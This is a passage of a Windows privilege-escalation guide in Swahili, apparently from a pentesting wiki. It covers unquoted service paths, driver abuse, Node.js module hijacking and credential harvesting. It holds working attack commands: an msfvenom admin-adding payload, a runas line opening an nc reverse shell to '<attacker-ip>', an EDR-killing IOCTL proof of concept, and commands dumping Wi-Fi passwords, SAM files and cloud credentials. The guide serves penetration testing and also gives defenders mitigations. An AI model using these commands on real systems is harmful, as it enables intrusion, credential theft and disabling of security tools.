Orodhesha huduma zote zenye njia zisizo na quotes, ukiondoa zile zinazomilikiwa na built-in Windows services:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Unaweza kugundua na kutumia** udhaifu huu kwa metasploit: `exploit/windows/local/trusted\_service\_path` Unaweza kuunda kwa mkono binary ya service kwa kutumia metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows huruhusu watumiaji kubainisha actions za kutekelezwa ikiwa service itashindwa. Kipengele hiki kinaweza kusanidiwa ili kielekeze kwa binary. Ikiwa binary hii inaweza kubadilishwa, privilege escalation inaweza kuwa inawezekana. Maelezo zaidi yanaweza kupatikana katika [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applications

### Installed Applications

Angalia **permissions of the binaries** (huenda unaweza ku-overwrite moja na kufanya privilege escalation) na za **folders** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Ruhusa za Kuandika

Angalia ikiwa unaweza kurekebisha faili fulani ya config ili kusoma faili maalum au ikiwa unaweza kurekebisha binary fulani ambayo itaendeshwa na akaunti ya Administrator (schedtasks).

Njia ya kupata weak folder/files permissions kwenye mfumo ni kufanya:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ hupakia kiotomatiki plugin yoyote DLL chini ya folda zake za `plugins`. Ikiwa kuna portable/copy install inayoweza kuandikwa, kuweka plugin mbaya kunatoa automatic code execution ndani ya `notepad++.exe` kwenye kila launch (ikijumuisha kutoka `DllMain` na plugin callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Angalia kama unaweza overwrite registry fulani au binary ambayo itatekelezwa na user mwingine.**\
**Soma** ukurasa ufuatao ili kujifunza zaidi kuhusu maeneo ya kuvutia ya **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Tafuta **third party weird/vulnerable** drivers zinazowezekana
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Ikiwa driver inafichua arbitrary kernel read/write primitive (kawaida katika IOCTL handlers zilizoundwa vibaya), unaweza kuongeza haki kwa kuiba SYSTEM token moja kwa moja kutoka kernel memory. Tazama mbinu ya hatua kwa hatua hapa:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Kwa race-condition bugs ambapo vulnerable call hufungua attacker-controlled Object Manager path, kupunguza kimakusudi kasi ya lookup (kwa kutumia max-length components au deep directory chains) kunaweza kuongeza window kutoka microseconds hadi tens of microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Hive vulnerabilities za kisasa hukuruhusu groom deterministic layouts, kutumia writable HKLM/HKU descendants vibaya, na kubadilisha metadata corruption kuwa kernel paged-pool overflows bila custom driver. Jifunze mnyororo mzima hapa:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Baadhi ya signed third‑party drivers huunda device object yao na strong SDDL kupitia IoCreateDeviceSecure lakini husahau kuweka FILE_DEVICE_SECURE_OPEN katika DeviceCharacteristics. Bila flag hii, secure DACL haitatekelezwa wakati device inafunguliwa kupitia path yenye extra component, hivyo kumruhusu mtumiaji yeyote asiye na haki kupata handle kwa kutumia namespace path kama:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (kutoka real-world case)

Mara mtumiaji anapoweza kufungua device, privileged IOCTLs zinazotolewa na driver zinaweza kutumiwa vibaya kwa LPE na tampering. Uwezo wa mfano ulioonekana ulimwenguni:
- Kurudisha handles za full-access kwa arbitrary processes (token theft / SYSTEM shell kupitia DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Kuua arbitrary processes, ikiwemo Protected Process/Light (PP/PPL), hivyo kuruhusu AV/EDR kill kutoka user land kupitia kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Hatua za kupunguza hatari kwa watengenezaji
- Daima weka FILE_DEVICE_SECURE_OPEN unapounda device objects zinazokusudiwa kuwa na vizuizi na DACL.
- Thibitisha caller context kwa shughuli zenye ruhusa za juu. Ongeza ukaguzi wa PP/PPL kabla ya kuruhusu process termination au kurudisha handle.
- Zuia IOCTLs (access masks, METHOD_*, uthibitishaji wa input) na zingatia brokered models badala ya direct kernel privileges.

Mawazo ya utambuzi kwa watetezi
- Fuatilia user-mode opens za majina ya device yanayotiliwa shaka (kwa mfano, \\ .\\amsdk*) na specific IOCTL sequences zinazoonyesha abuse.
- Tekeleza Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) na dumisha allow/deny lists zako mwenyewe.


## PATH DLL Hijacking

Ikiwa una **ruhusa za kuandika ndani ya folder iliyopo kwenye PATH** unaweza kuweza hijack DLL inayopakiwa na process na **kuongeza ruhusa**.

Angalia ruhusa za folders zote ndani ya PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Kwa taarifa zaidi kuhusu jinsi ya kutumia vibaya ukaguzi huu:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

Hii ni toleo la **Windows uncontrolled search path** linaloathiri programu za **Node.js** na **Electron** wanapofanya bare import kama `require("foo")` na module inayotarajiwa haipo (**missing**).

Node hutatua packages kwa kupanda juu kwenye mti wa directory na kuangalia folders za `node_modules` kwenye kila parent. Kwenye Windows, hiyo safari inaweza kufikia root ya drive, hivyo programu iliyozinduliwa kutoka `C:\Users\Administrator\project\app.js` inaweza kuishia kujaribu:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ikiwa **low-privileged user** anaweza kuunda `C:\node_modules`, anaweza kuweka `foo.js` ya kitabaka (au package folder) na kusubiri **higher-privileged Node/Electron process** itatue dependency inayokosekana. Payload inatekelezwa ndani ya security context ya process ya mwathiriwa, hivyo hii inakuwa **LPE** pale tu target inapoendeshwa kama administrator, kutoka elevated scheduled task/service wrapper, au kutoka privileged desktop app iliyoanzishwa kiotomatiki.

Hii huwa ya kawaida hasa wakati:

- dependency imetajwa katika `optionalDependencies`
- library ya mtu wa tatu inafunga `require("foo")` ndani ya `try/catch` na inaendelea baada ya kushindwa
- package iliondolewa kwenye production builds, ikaachwa wakati wa packaging, au ikashindwa kusakinishwa
- vulnerable `require()` ipo ndani kabisa ya dependency tree badala ya kuwa kwenye main application code

### Hunting vulnerable targets

Tumia **Procmon** kuthibitisha resolution path:

- Chuja kwa `Process Name` = target executable (`node.exe`, Electron app EXE, au wrapper process)
- Chuja kwa `Path` `contains` `node_modules`
- Zingatia `NAME NOT FOUND` na open ya mwisho iliyofanikiwa chini ya `C:\node_modules`

Useful code-review patterns in unpacked `.asar` files or application sources:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Ufaidishaji

1. Tambua **jina la package linalokosekana** kutoka Procmon au source review.
2. Unda root lookup directory ikiwa haipo tayari:
```powershell
mkdir C:\node_modules
```
3. Achia module yenye jina halisi linalotarajiwa:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Chochea programu ya mwathiriwa. Ikiwa programu inajaribu `require("foo")` na moduli halali haipo, Node inaweza kupakia `C:\node_modules\foo.js`.

Mifano ya kweli ya moduli za hiari zinazokosekana zinazolingana na muundo huu ni pamoja na `bluebird` na `utf-8-validate`, lakini **technique** muhimu ni ile inayoweza kutumiwa tena: tafuta tu **missing bare import** yoyote ambayo process ya Windows Node/Electron yenye priviliji itaitatua.

### Detection and hardening ideas

- Toa alert wakati mtumiaji anaunda `C:\node_modules` au anaandika `.js` mpya/packages hapo.
- Fuatilia high-integrity processes zikisoma kutoka `C:\node_modules\*`.
- Pakia dependencies zote za runtime kwenye production na kagua matumizi ya `optionalDependencies`.
- Kagua code ya wahusika wengine kwa mifumo ya kimya ya `try { require("...") } catch {}`.
- Zima optional probes wakati library inasaidia hivyo (kwa mfano, baadhi ya `ws` deployments zinaweza kuepuka legacy `utf-8-validate` probe kwa `WS_NO_UTF_8_VALIDATE=1`).

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Angalia kompyuta nyingine zinazojulikana ambazo zimehardcode kwenye hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interface za Mtandao & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Milango Huria

Angalia **restricted services** kutoka nje
```bash
netstat -ano #Opened ports?
```
### Jedwali la Uelekezaji
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Jedwali la ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Kanuni za Firewall

[**Angalia ukurasa huu kwa amri zinazohusiana na Firewall**](../basic-cmd-for-pentesters.md#firewall) **(orodhesha kanuni, tengeneza kanuni, zima, zima...)**

Zaidi[ amri za network enumeration hapa](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` pia inaweza kupatikana katika `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ukipata root user unaweza kusikiliza kwenye port yoyote (mara ya kwanza unapotumia `nc.exe` kusikiliza kwenye port itakuuliza kupitia GUI kama `nc` inapaswa kuruhusiwa na firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Ili kuanza bash kama root kwa urahisi, unaweza kujaribu `--default-user root`

Unaweza kuchunguza filesystem ya `WSL` kwenye folda `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault huhifadhi vitambulisho vya mtumiaji kwa servers, websites na programs nyingine ambazo **Windows** inaweza **kuingia kwa watumiaji kiotomatiki**. Kwa mtazamo wa kwanza, hii inaweza kuonekana kama sasa watumiaji wanaweza kuhifadhi credentials zao za Facebook, Twitter, Gmail n.k., ili ziweze kuingia kiotomatiki kupitia browsers. Lakini sivyo ilivyo.

Windows Vault huhifadhi credentials ambazo Windows inaweza kuingia kwa watumiaji kiotomatiki, ambayo inamaanisha kuwa application yoyote ya **Windows ambayo inahitaji credentials ili kufikia resource** (server au website) **inaweza kutumia Credential Manager hii** & Windows Vault na kutumia credentials zilizotolewa badala ya watumiaji kuingiza username na password kila wakati.

Isipokuwa applications ziingiliane na Credential Manager, sidhani kama inawezekana kwao kutumia credentials za resource fulani. Kwa hivyo, ikiwa application yako inataka kutumia vault, inapaswa kwa njia fulani **kuwasiliana na credential manager na kuomba credentials za resource hiyo** kutoka kwenye default storage vault.

Tumia `cmdkey` kuorodhesha credentials zilizohifadhiwa kwenye machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Kisha unaweza kutumia `runas` na chaguo la `/savecred` ili kutumia credentials zilizohifadhiwa. Mfano ufuatao unaita binary ya mbali kupitia SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Kutumia `runas` na seti ya credential iliyotolewa.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

**Data Protection API (DPAPI)** hutoa njia ya usimbaji fiche wa data kwa kutumia symmetric encryption, hasa hutumiwa ndani ya mfumo wa uendeshaji wa Windows kwa ajili ya kusimba fiche private keys za asymmetric. Usimbaji huu hutumia siri ya mtumiaji au ya mfumo ili kuchangia kwa kiasi kikubwa entropy.

**DPAPI inawezesha usimbaji fiche wa keys kupitia symmetric key inayotokana na siri za kuingia za mtumiaji**. Katika hali zinazohusisha system encryption, hutumia siri za uthibitishaji za domain za mfumo.

Encrypted user RSA keys, kwa kutumia DPAPI, huhifadhiwa kwenye saraka ya `%APPDATA%\Microsoft\Protect\{SID}`, ambapo `{SID}` inawakilisha [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) ya mtumiaji. **DPAPI key, iliyo pamoja na master key inayolinda private keys za mtumiaji kwenye faili ileile**, kwa kawaida huwa na bytes 64 za data ya nasibu. (Ni muhimu kuzingatia kwamba ufikiaji wa saraka hii umezuiwa, hivyo haiwezekani kuorodhesha yaliyomo kwa kutumia amri `dir` kwenye CMD, ingawa inaweza kuorodheshwa kupitia PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Unaweza kutumia **mimikatz module** `dpapi::masterkey` pamoja na arguments zinazofaa (`/pvk` au `/rpc`) kuifungua.

**credentials files** zilizolindwa na **master password** kwa kawaida zipo katika:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Unaweza kutumia **mimikat module** `dpapi::cred` pamoja na `/masterkey` inayofaa ili kudecrypt.\
Unaweza **kutoa DPAPI nyingi** **masterkeys** kutoka kwenye **memory** kwa kutumia module ya `sekurlsa::dpapi` (ikiwa wewe ni root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** mara nyingi hutumiwa kwa **scripting** na kazi za automation kama njia ya kuhifadhi credentials zilizosimbwa kwa njia ya encryption kwa urahisi. Credentials hizi zinalindwa kwa kutumia **DPAPI**, ambayo kwa kawaida inamaanisha zinaweza tu ku-decryptiwa na mtumiaji yuleyule kwenye kompyuta ileile ambako ziliundwa.

Ili **ku-decrypt** PS credentials kutoka kwenye faili linalozihifadhi unaweza kufanya:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Miunganisho ya RDP Iliyohifadhiwa

Unaweza kuzipata kwenye `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
na katika `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Amri Zilizotekelezwa Hivi Karibuni
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
Unaweza **kutoa masterkeys nyingi za DPAPI** kutoka kwenye kumbukumbu kwa kutumia module ya Mimikatz `sekurlsa::dpapi`

### Sticky Notes

Watu mara nyingi hutumia app ya StickyNotes kwenye Windows workstations kuhifadhi **passwords** na taarifa nyingine, bila kutambua kwamba ni faili ya database. Faili hili linapatikana katika `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` na daima linafaa kutafutwa na kuchunguzwa.

### AppCmd.exe

**Kumbuka kwamba ili kurecover passwords kutoka AppCmd.exe unahitaji kuwa Administrator na uendeshe chini ya kiwango cha High Integrity.**\
**AppCmd.exe** iko kwenye saraka ya `%systemroot%\system32\inetsrv\`.\
Ikiwa faili hili lipo basi inawezekana kwamba baadhi ya **credentials** zimesanidiwa na zinaweza **kurecovered**.

Hii code ilitolewa kutoka [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Angalia kama `C:\Windows\CCM\SCClient.exe` ipo .\
Installers **zinaendeshwa kwa ruhusa za SYSTEM**, nyingi ziko hatarini kwa **DLL Sideloading (Info kutoka** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Faili na Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Funguo za Mwenyeji za Putty SSH
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys katika registry

SSH private keys zinaweza kuhifadhiwa ndani ya registry key `HKCU\Software\OpenSSH\Agent\Keys` hivyo unapaswa kuangalia kama kuna chochote cha kuvutia humo:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Ukipata ingizo lolote ndani ya njia hiyo huenda ni ufunguo wa SSH uliohifadhiwa. Umehifadhiwa kwa njia ya usimbaji fiche lakini unaweza kufichuliwa kwa urahisi kwa kutumia [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Taarifa zaidi kuhusu mbinu hii hapa: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Ikiwa huduma ya `ssh-agent` haifanyi kazi na unataka ianze kiotomatiki wakati wa boot endesha:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Inaonekana mbinu hii si sahihi tena. Nilijaribu kuunda baadhi ya ssh keys, kuziacha ziongezwe kwa `ssh-add` na kuingia kupitia ssh kwenye machine. Registry HKCU\Software\OpenSSH\Agent\Keys haipo na procmon haikutambua matumizi ya `dpapi.dll` wakati wa asymmetric key authentication.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Unaweza pia kutafuta faili hizi kwa kutumia **metasploit**: _post/windows/gather/enum_unattend_

Mfano wa maudhui:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Nakala za SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Tafuta faili inayoitwa **SiteList.xml**

### Cached GPP Pasword

Kipengele kilikuwapo hapo awali kilichoruhusu kusambazwa kwa akaunti maalum za local administrator kwenye kundi la mashine kupitia Group Policy Preferences (GPP). Hata hivyo, njia hii ilikuwa na dosari kubwa za usalama. Kwanza, Group Policy Objects (GPOs), zilizohifadhiwa kama faili za XML ndani ya SYSVOL, zingeweza kufikiwa na mtumiaji yeyote wa domain. Pili, passwords ndani ya GPP hizi, zilizosimbwa kwa AES256 kwa kutumia default key iliyohifadhiwa hadharani kwenye documentation, zingeweza kufichuliwa na mtumiaji yeyote aliyeauthentikishwa. Hii iliweka hatari kubwa, kwa kuwa ingeweza kuruhusu watumiaji kupata elevated privileges.

Ili kupunguza hatari hii, function ilitengenezwa ili kuchanganua locally cached GPP files zilizo na uga wa "cpassword" ambao si mtupu. Baada ya kupata faili kama hilo, function hufanya decrypt ya password na kurudisha custom PowerShell object. Object hii inajumuisha maelezo kuhusu GPP na mahali faili lilipo, ikisaidia katika utambuzi na kurekebisha udhaifu huu wa usalama.

Tafuta ndani ya `C:\ProgramData\Microsoft\Group Policy\history` au ndani ya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (kabla ya W Vista)_ kwa faili hizi:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Ili ku-decrypt cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Kutumia crackmapexec kupata passwords:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
